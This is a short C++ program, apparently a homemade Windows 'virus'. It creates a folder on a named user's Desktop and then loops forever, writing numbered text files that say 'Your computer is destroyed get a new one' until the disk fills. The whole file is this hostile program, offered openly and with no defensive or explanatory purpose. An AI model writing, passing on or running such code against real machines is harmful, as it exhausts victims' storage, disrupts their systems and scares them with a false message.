#include<iostream>
#include<fstream>
#include<string>
#include<direct.h>
using namespace std;

main()
{
    long i = 0;
    const char *path = "C:\\Users\\91600\\Desktop\\virus";
    string content = "Your computer is destroyed get a new one ";
    _mkdir(path);
    while(true)
    {
        i++;
        ofstream file;
        file.open(path + to_string(i) + ".txt" , ios_base::out);
        file << content;
        file.close();
        cout << "File created : " + to_string(i) + "\r\n";
    }

}